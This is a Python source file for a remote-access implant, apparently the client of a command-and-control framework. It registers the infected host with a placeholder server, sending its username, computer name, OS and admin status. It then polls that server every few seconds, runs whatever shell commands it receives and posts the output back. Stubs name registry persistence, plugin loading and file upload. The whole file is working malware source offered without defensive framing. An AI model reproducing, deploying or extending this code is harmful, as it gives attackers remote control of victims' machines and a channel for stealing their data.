import requests 
import subprocess 
import time
import random
import string
import platform
import getpass
import json
import os
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Client:
    def __init__(self):
        self.functions = {
            "GetCurrentDirectory": self.GetCurrentDirectory,
            "GetFiles": self.GetFiles,
            "ChangeCurrentDirectory":  self.ChangeCurrentDirectory,
            "LoadPlugin": self.unsupported,
            "CreatePersistenceReg": self.unsupported,
            "DeletePersistenceReg": self.unsupported,
            "UploadFile": self.unsupported
        }

        self.ID = ''.join([random.choice(string.ascii_letters 
                    + string.digits) for n in range(12)])
        uname = platform.uname()

        self.init_data = {
            "name": self.ID,
            "os": uname[0],
            "arch": uname[-1],
            "username": getpass.getuser(),
            "computername": platform.node(),
            "av": "No",
            "isadmin": self.is_admin()
        }

    def GetCurrentDirectory(self, data):
        return  os.getcwd(), None

    def GetFiles(self, data):
        return  os.listdir(), None
    
    def ChangeCurrentDirectory(self, data):
        result = "Done"
        error = ""
        try:
            os.chdir(data.get("args"))
        except Exception as e:
            result = ""
            error = str(e)
        return result, error
    
    def unsupported(self, data):
        return  "", "Unsupported"

    def is_admin(self):
        admin = True
        if os.name == 'nt':
            try:
                tmp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\\windows'),'temp']))
            except:
                admin = False
        else:
            if 'SUDO_USER' not in os.environ or os.geteuid() != 0:
                admin = False
        return admin


    def connection(self, url):
        req = requests.get(url + "/" + self.ID, verify=False)
        command = req.json()
        if command.get("id", None):
            execute = command["command"]
            command_type = command["type"]
            data = {"task_id": command["id"], "output": "", "error": ""}
            if command_type == "command":
                if 'terminate' in execute:
                    return False 
                else:
                    CMD = subprocess.Popen(execute, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    error = CMD.stderr.read().strip().decode()
                    output = CMD.stdout.read().strip().decode()
                    print(output)
                    if output:
                        data["output"] = output
                    if error:
                        data["error"] = error
                    
            elif command_type == "function":
                try:
                    output, error = self.functions.get(execute)(command)
                    if output:
                        data["output"] = output
                    else:
                        data["error"] = error
                except Exception as e:
                    data["error"] = e
            else:
                return True
            void = requests.post(url=url + f"/result/{self.ID}", data=json.dumps(data), verify=False)

        return True

    def main(self):
        follow = True
        url = "https://xx.xx.xx.xx:yyyy"
        while True:
            try:
                void = requests.post(url=url + "/new", data=json.dumps(self.init_data), verify=False)
                break
            except:
                time.sleep(5)
        error = 0
        while follow: 
            try:
                time.sleep(5)
                follow = self.connection(url)
                error = 0
            except Exception as e:
                error += 1
                if error == 5:
                    follow = False

if __name__ == "__main__":
    Client().main()
